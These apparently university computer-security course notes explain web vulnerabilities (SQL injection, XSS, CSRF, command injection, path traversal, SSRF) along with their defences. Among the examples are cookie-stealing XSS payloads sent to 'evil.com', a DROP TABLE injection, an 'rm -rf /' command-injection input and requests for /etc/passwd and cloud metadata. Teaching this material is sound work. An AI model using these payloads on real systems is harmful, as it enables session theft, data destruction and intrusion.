---
title: "Web Security"
order: 7
moduleTitle: "COMP3028 - Computer Security"
tags: ["XSS", "CSRF", "SQL-injection", "OWASP", "web-security"]
---

## OWASP Top 10 (2021)

:::eli10

OWASP is a group that keeps a list of the 10 most dangerous web security problems. These include things like letting hackers run their own code on your website, leaking people's private data, and using broken locks (weak encryption). Developers use this list to know what to protect against first.

:::

:::eli15

The OWASP Top 10 is an industry-standard awareness document listing the most critical web application security risks, updated every few years. The 2021 edition emphasises that broken access control is now the number-one risk (users accessing resources they should not), followed by cryptographic failures (exposing sensitive data) and injection attacks (SQL, command, LDAP). Newer entries include insecure design (flawed architecture before implementation even begins), software/data integrity failures (untrusted updates), and SSRF (server-side request forgery). Understanding these categories helps developers prioritise security efforts.

:::

:::eli20

| # | Category | Key risk |
|---|----------|----------|
| 1 | Broken Access Control | Unauthorised access to resources |
| 2 | Cryptographic Failures | Sensitive data exposed (weak crypto) |
| 3 | Injection | SQL, OS command, LDAP injection |
| 4 | Insecure Design | Flawed architecture/design |
| 5 | Security Misconfiguration | Default creds, unnecessary features |
| 6 | Vulnerable Components | Outdated libraries with known CVEs |
| 7 | Auth Failures | Broken authentication/session management |
| 8 | Software/Data Integrity | Untrusted updates, CI/CD compromise |
| 9 | Logging Failures | Insufficient monitoring/alerting |
| 10 | SSRF | Server-Side Request Forgery |

:::

## SQL Injection

:::eli10

Imagine a website asks for your username and puts it directly into a command to its database. A hacker types special database commands instead of a real username, tricking the database into doing whatever they want -- like showing all passwords or deleting everything. The fix is to keep user input completely separate from database commands (parameterised queries).

:::

:::eli15

SQL injection occurs when user input is concatenated directly into SQL queries without sanitisation. An attacker can manipulate the query logic to bypass authentication, extract sensitive data, modify or delete records, or even execute system commands. Variants include classic (results visible), blind boolean-based (true/false differences), blind time-based (using SLEEP to infer data), and second-order (payload stored and triggered later). The primary defence is parameterised queries (prepared statements), which structurally separate SQL code from user data so the input is always treated as data, never as executable SQL. Additional layers include input validation, least-privilege database accounts, and WAFs.

:::

:::eli20

### How It Works

Unsanitised user input is concatenated into SQL queries.

```sql
-- Vulnerable code
query = "SELECT * FROM users WHERE name='" + input + "'"

-- Attacker input: ' OR '1'='1
-- Resulting query:
SELECT * FROM users WHERE name='' OR '1'='1'
-- Returns ALL users
```

### Types

| Type | Behaviour |
|------|-----------|
| Classic (in-band) | Results shown in response |
| Blind (boolean) | True/false response differences |
| Blind (time-based) | Response time differences (`SLEEP(5)`) |
| Out-of-band | Data exfiltrated via DNS/HTTP to attacker |
| Second-order | Payload stored, executes later |

### Attack Examples

```sql
-- Authentication bypass
' OR 1=1 --

-- Extract data (UNION-based)
' UNION SELECT username, password FROM users --

-- Drop table
'; DROP TABLE users; --

-- Time-based blind
' OR IF(1=1, SLEEP(5), 0) --
```

### Mitigation

| Defence | How | Effectiveness |
|---------|-----|:---:|
| **Prepared statements** (parameterised queries) | Separate SQL logic from data | Best |
| Stored procedures | Pre-compiled queries | Good |
| Input validation (whitelist) | Only allow expected characters | Defence in depth |
| Escaping | Escape special characters | Fragile (not recommended alone) |
| Least privilege | DB user has minimal permissions | Limits damage |
| WAF | Web Application Firewall rules | Defence in depth |

```python
# SAFE: Parameterised query
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# UNSAFE: String concatenation
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
```

:::

## Cross-Site Scripting (XSS)

:::eli10

XSS is when a hacker sneaks their own code (JavaScript) onto a website that other people visit. When those people load the page, the hacker's code runs in their browser and can steal their login cookies, redirect them to fake pages, or spy on everything they type. The fix is to make sure any user-provided content is displayed as plain text, not executed as code.

:::

:::eli15

Cross-Site Scripting (XSS) allows an attacker to inject malicious JavaScript into web pages viewed by other users. Reflected XSS puts the payload in a URL that victims click. Stored XSS saves the payload to the server database, executing for every visitor. DOM-based XSS manipulates client-side JavaScript without involving the server. Impact ranges from session hijacking (stealing cookies) to full account takeover. Key defences include output encoding (converting special characters to HTML entities), Content Security Policy headers (restricting where scripts can load from), HttpOnly cookies (inaccessible to JavaScript), and using modern frameworks like React that auto-escape output by default.

:::

:::eli20

### How It Works

Attacker injects malicious JavaScript that executes in victim's browser.

### Types

| Type | Storage | Trigger |
|------|---------|---------|
| **Reflected** | Not stored; in URL/request | Victim clicks crafted link |
| **Stored** (Persistent) | Saved in database | Anyone viewing the page |
| **DOM-based** | Client-side only | Manipulates DOM without server |

### Attack Examples

```html
<!-- Reflected XSS in search -->
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- Stored XSS in comment -->
<script>fetch('https://evil.com/log?cookie='+document.cookie)</script>

<!-- DOM-based XSS -->
<script>
  var input = location.hash.substring(1);
  document.getElementById('output').innerHTML = input;  // Dangerous!
</script>
```

### Impact

| Impact | Example |
|--------|---------|
| Session hijacking | Steal cookies |
| Credential theft | Inject fake login form |
| Keylogging | Capture user keystrokes |
| Defacement | Modify page content |
| Malware distribution | Redirect to malicious site |

### Mitigation

| Defence | How |
|---------|-----|
| **Output encoding** | Encode `<`, `>`, `&`, `"`, `'` as HTML entities |
| **Content Security Policy (CSP)** | Restrict script sources: `script-src 'self'` |
| **HttpOnly cookies** | JavaScript cannot access cookies |
| Input validation | Reject/sanitise suspicious input |
| DOM manipulation safety | Use `textContent` not `innerHTML` |
| Frameworks | Modern frameworks auto-escape (React, Angular) |

:::

## Cross-Site Request Forgery (CSRF)

:::eli10

CSRF tricks your browser into doing something you did not mean to do. If you are logged into your bank and then visit a bad website, that website can secretly send a request to your bank (like "transfer money to the attacker") and your browser will automatically include your login cookie, making the bank think it was you. The fix is to include a secret token in forms that the attacker cannot guess.

:::

:::eli15

CSRF exploits the fact that browsers automatically attach cookies to every request to a domain, regardless of where the request originated. If a victim is logged into a site and visits an attacker-controlled page, the attacker's page can trigger requests to the target site (via hidden forms, image tags, etc.) that carry the victim's session cookie. The server cannot distinguish these forged requests from legitimate ones. Defences include anti-CSRF tokens (unique random values embedded in forms that attackers cannot predict), SameSite cookie attributes (preventing cookies from being sent on cross-origin requests), and checking Origin/Referer headers. Unlike XSS, CSRF cannot read the response -- it can only trigger actions.

:::

:::eli20

### How It Works

Victim's browser sends authenticated request to target site (exploiting existing session cookie).

```html
<!-- On attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Or form auto-submit -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### Conditions Required

1. Victim is authenticated (has session cookie)
2. Target site relies only on cookies for authentication
3. Attacker can predict all request parameters

### Mitigation

| Defence | How |
|---------|-----|
| **Anti-CSRF token** | Unique per-session/per-request token in forms |
| **SameSite cookies** | `SameSite=Strict` or `Lax` |
| **Check Origin/Referer** | Verify request origin matches site |
| Re-authentication | Require password for sensitive actions |
| Custom headers | AJAX with custom header (CORS blocks cross-origin) |

### CSRF vs XSS

| | CSRF | XSS |
|-|------|-----|
| Exploits | User's authenticated session | Trust in the website |
| Attacker can | Perform actions as victim | Read/modify page, steal data |
| Requires | Victim visits attacker page | Injection point on target site |
| Limitation | Cannot read responses | Full browser access (within origin) |

:::

## Other Web Vulnerabilities

:::eli10

There are many other ways websites can be attacked. Command injection tricks the server into running system commands. Path traversal lets attackers read files they should not (like password files). SSRF makes the server fetch internal resources on the attacker's behalf. The common theme is: never trust user input and always validate everything.

:::

:::eli15

Beyond the "big three" (SQLi, XSS, CSRF), several other vulnerabilities are commonly exploited. Command injection passes user input directly to system shell commands. Path traversal uses "../" sequences to escape intended directories and access sensitive files. SSRF tricks the server into making requests to internal resources (cloud metadata endpoints, internal APIs). Insecure deserialisation allows attackers to manipulate serialised objects to achieve code execution. The common defence principle is to never trust user input -- validate, sanitise, and use safe APIs that separate data from commands or paths.

:::

:::eli20

### Command Injection

```python
# Vulnerable
os.system("ping " + user_input)
# Input: ; rm -rf /
# Executes: ping ; rm -rf /
```

Defence: Never pass user input to shell commands. Use parameterised APIs.

### Path Traversal

```
https://site.com/file?name=../../../etc/passwd
```

Defence: Validate/canonicalise paths, chroot, whitelist allowed files.

### Server-Side Request Forgery (SSRF)

```
https://site.com/fetch?url=http://169.254.169.254/metadata
```

Attacker makes server request internal resources. Defence: URL allowlist, block internal IPs.

### Insecure Deserialisation

Untrusted data deserialised into objects that execute code. Defence: Don't deserialise untrusted data, use data-only formats (JSON).

:::

## Security Headers

:::eli10

Security headers are special instructions your website sends to browsers telling them how to behave safely. For example, one header says "only load scripts from my own domain" (blocking injected scripts), another says "always use HTTPS" (preventing eavesdropping), and another says "do not let other sites put me in a frame" (preventing clickjacking tricks).

:::

:::eli15

HTTP security headers instruct browsers to enable built-in security features. Content-Security-Policy (CSP) is the most powerful -- it restricts which domains can serve scripts, styles, images, and other resources, effectively neutralising many XSS attacks. Strict-Transport-Security (HSTS) forces HTTPS for all future visits, preventing SSL-stripping attacks. X-Frame-Options prevents clickjacking by disallowing framing. X-Content-Type-Options prevents MIME sniffing attacks. These headers are easy to deploy and provide significant defence-in-depth against common web attacks.

:::

:::eli20

| Header | Purpose | Example |
|--------|---------|---------|
| `Content-Security-Policy` | Restrict resource loading | `default-src 'self'` |
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains` |
| `X-XSS-Protection` | Browser XSS filter | `1; mode=block` (deprecated) |
| `Referrer-Policy` | Control Referer header | `strict-origin-when-cross-origin` |

<details>
<summary><strong>Practice: Identify the vulnerability type</strong></summary>

1. User comment displayed without encoding --> **Stored XSS**
2. Transfer funds via GET request without token --> **CSRF**
3. `"SELECT * FROM items WHERE id=" + request.id` --> **SQL Injection**
4. `os.system("convert " + filename)` --> **Command Injection**
5. `open("/uploads/" + user_path)` --> **Path Traversal**
6. Image URL fetched by server from user input --> **SSRF**
</details>

<details>
<summary><strong>Practice: Why doesn't CSRF work with custom headers?</strong></summary>

1. Browsers enforce the Same-Origin Policy for AJAX requests
2. Cross-origin requests with custom headers trigger a CORS preflight (OPTIONS request)
3. The target server would not include the attacker's origin in `Access-Control-Allow-Origin`
4. The browser blocks the request
5. Simple requests (GET/POST with standard headers) do not trigger preflight -- hence CSRF tokens are still needed for forms
</details>

:::
